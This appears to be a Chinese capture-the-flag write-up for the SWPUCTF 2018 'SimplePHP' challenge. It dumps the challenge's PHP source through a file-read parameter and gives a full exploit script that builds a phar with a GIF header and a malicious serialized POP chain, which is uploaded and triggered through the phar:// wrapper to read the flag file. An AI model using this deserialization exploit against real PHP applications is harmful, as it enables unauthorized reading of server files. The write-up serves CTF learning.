# 原创
：  [SWPUCTF 2018]SimplePHP

# [SWPUCTF 2018]SimplePHP

#### [SWPUCTF 2018]SimplePHP

## 考点

> 
文件包含、Phar反序列化


## 思路

> 
页面存在一个简单的文件上传页面，以及一个查看上传之后的文件的地方<br/> 查看文件出的url为`http://b2674493-8a2d-4652-92da-b88fca9fb552.node3.buuoj.cn/file.php?file=`，看到`file=`尝试一下文件内容读取<br/> F12查看发现有提示`&lt;!--flag is in f1ag.php--&gt;`，尝试伪协议读取但是没成功<br/> 尝试直接`file=index.php`发现可以读取，干脆把可以读取的都读取一遍


> 
分析



## Payload

> 
读取index.php`http://b2674493-8a2d-4652-92da-b88fca9fb552.node3.buuoj.cn/file.php?file=index.php`


```
&lt;?php 
header("content-type:text/html;charset=utf-8");  
include 'base.php';
?&gt; 

```

> 
读取base.php`http://b2674493-8a2d-4652-92da-b88fca9fb552.node3.buuoj.cn/file.php?file=base.php`


```
&lt;?php 
    session_start(); 
?&gt; 
&lt;!DOCTYPE html&gt; 
&lt;html&gt; 
&lt;head&gt; 
    &lt;meta charset="utf-8"&gt; 
    &lt;title&gt;web3&lt;/title&gt; 
    &lt;link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"&gt; 
    &lt;script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"&gt;&lt;/script&gt; 
    &lt;script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt; 
&lt;/head&gt; 
&lt;body&gt; 
    &lt;nav class="navbar navbar-default" role="navigation"&gt; 
        &lt;div class="container-fluid"&gt; 
        &lt;div class="navbar-header"&gt; 
            &lt;a class="navbar-brand" href="index.php"&gt;首页&lt;/a&gt; 
        &lt;/div&gt; 
            &lt;ul class="nav navbar-nav navbra-toggle"&gt; 
                &lt;li class="active"&gt;&lt;a href="file.php?file="&gt;查看文件&lt;/a&gt;&lt;/li&gt; 
                &lt;li&gt;&lt;a href="upload_file.php"&gt;上传文件&lt;/a&gt;&lt;/li&gt; 
            &lt;/ul&gt; 
            &lt;ul class="nav navbar-nav navbar-right"&gt; 
                &lt;li&gt;&lt;a href="index.php"&gt;&lt;span class="glyphicon glyphicon-user"&gt;&lt;/span&gt;&lt;?php echo $_SERVER['REMOTE_ADDR'];?&gt;&lt;/a&gt;&lt;/li&gt; 
            &lt;/ul&gt; 
        &lt;/div&gt; 
    &lt;/nav&gt; 
&lt;/body&gt; 
&lt;/html&gt; 
&lt;!--flag is in f1ag.php--&gt;

```

> 
读取file.php`http://b2674493-8a2d-4652-92da-b88fca9fb552.node3.buuoj.cn/file.php?file=file.php`


```
&lt;?php 
header("content-type:text/html;charset=utf-8");  
include 'function.php'; 
include 'class.php'; 
ini_set('open_basedir','/var/www/html/'); 
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "&lt;h2&gt;There is no file to show!&lt;h2/&gt;"; 
} 
$show = new Show(); 
if(file_exists($file)) { 
    $show-&gt;source = $file; 
    $show-&gt;_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 
?&gt; 

```

> 
读取upload_file.php`http://b2674493-8a2d-4652-92da-b88fca9fb552.node3.buuoj.cn/file.php?file=upload_file.php`


```
&lt;?php 
include 'function.php'; 
upload_file(); 
?&gt; 
&lt;html&gt; 
&lt;head&gt; 
&lt;meta charest="utf-8"&gt; 
&lt;title&gt;文件上传&lt;/title&gt; 
&lt;/head&gt; 
&lt;body&gt; 
&lt;div align = "center"&gt; 
        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; 
&lt;/div&gt; 
&lt;style&gt; 
    p{ margin:0 auto} 
&lt;/style&gt; 
&lt;div&gt; 
&lt;form action="upload_file.php" method="post" enctype="multipart/form-data"&gt; 
    &lt;label for="file"&gt;文件名:&lt;/label&gt; 
    &lt;input type="file" name="file" id="file"&gt;&lt;br&gt; 
    &lt;input type="submit" name="submit" value="提交"&gt; 
&lt;/div&gt; 

&lt;/script&gt; 
&lt;/body&gt; 
&lt;/html&gt;

```

> 
读取function.php`http://b2674493-8a2d-4652-92da-b88fca9fb552.node3.buuoj.cn/file.php?file=function.php`


```
&lt;?php 
//show_source(__FILE__); 
include "base.php"; 
header("Content-type: text/html;charset=utf-8"); 
error_reporting(0); 
function upload_file_do() { 
    global $_FILES; 
    $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg"; 
    //mkdir("upload",0777); 
    if(file_exists("upload/" . $filename)) { 
        unlink($filename); 
    } 
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename); 
    echo '&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'; 
} 
function upload_file() { 
    global $_FILES; 
    if(upload_file_check()) { 
        upload_file_do(); 
    } 
} 
function upload_file_check() { 
    global $_FILES; 
    $allowed_types = array("gif","jpeg","jpg","png"); 
    $temp = explode(".",$_FILES["file"]["name"]); 
    $extension = end($temp); 
    if(empty($extension)) { 
        //echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; 
    } 
    else{ 
        if(in_array($extension,$allowed_types)) { 
            return true; 
        } 
        else { 
            echo '&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'; 
            return false; 
        } 
    } 
} 
?&gt; 

```

> 
读取class.php`http://b2674493-8a2d-4652-92da-b88fca9fb552.node3.buuoj.cn/file.php?file=class.php`


```
&lt;?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this-&gt;str = $name;
    }
    public function __destruct()
    {
        $this-&gt;test = $this-&gt;str;
        echo $this-&gt;test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg
        echo $this-&gt;source;
    }
    public function __toString()
    {
        $content = $this-&gt;str['str']-&gt;source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this-&gt;$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this-&gt;source)) {
            die('hacker!');
        } else {
            highlight_file($this-&gt;source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this-&gt;source)) {
            echo "hacker~";
            $this-&gt;source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this-&gt;params = array();
    }
    public function __get($key)
    {
        return $this-&gt;get($key);
    }
    public function get($key)
    {
        if(isset($this-&gt;params[$key])) {
            $value = $this-&gt;params[$key];
        } else {
            $value = "index.php";
        }
        return $this-&gt;file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?&gt;

```

> 
POP链构造



> 
exp构造


```
&lt;?php
class C1e4r
{
    public $test;
    public $str;
}
class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params = array('source' =&gt; 'var/www/html/f1ag.php');
}

    @unlink("c1e4r.phar");
    $phar = new Phar("c1e4r.phar");
    $phar-&gt;startBuffering();
    $phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;");
    $p1 = new C1e4r();
    $p2 = new Show();
    $p2-&gt;str = array('str'=&gt;new Test());
    $p1-&gt;str = $p2;

    $phar-&gt;setMetadata($p1); 
    var_dump($phar-&gt;getMetadata());
    $phar-&gt;addFromString("test.txt", "c1e4r"); 
    //签名自动计算
    $phar-&gt;stopBuffering();
?&gt;

```

> 
将生成的phar文件修改后缀名为gif上传<br/> 访问`http://b2674493-8a2d-4652-92da-b88fca9fb552.node3.buuoj.cn/upload/`查看上传的文件<br/> 用phar伪协议读取flag

